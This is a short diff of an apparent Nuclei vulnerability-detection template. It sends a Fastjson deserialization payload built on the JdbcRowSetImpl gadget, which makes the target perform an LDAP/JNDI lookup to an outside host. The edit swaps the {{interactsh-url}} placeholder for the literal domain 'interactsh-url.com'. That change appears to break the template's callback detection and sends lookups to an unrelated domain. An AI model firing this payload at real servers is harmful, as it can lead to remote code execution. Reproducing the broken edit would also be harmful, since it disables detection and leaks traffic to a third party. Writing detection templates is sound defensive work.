@@ -23,7 +23,7 @@ http:
         Host: {{Hostname}}
         Content-Type: application/json
 
-        {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true},"hfe4zyyzldp":"="}
+        {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://interactsh-url.com","autoCommit":true},"hfe4zyyzldp":"="}
 
     matchers-condition: and
     matchers:
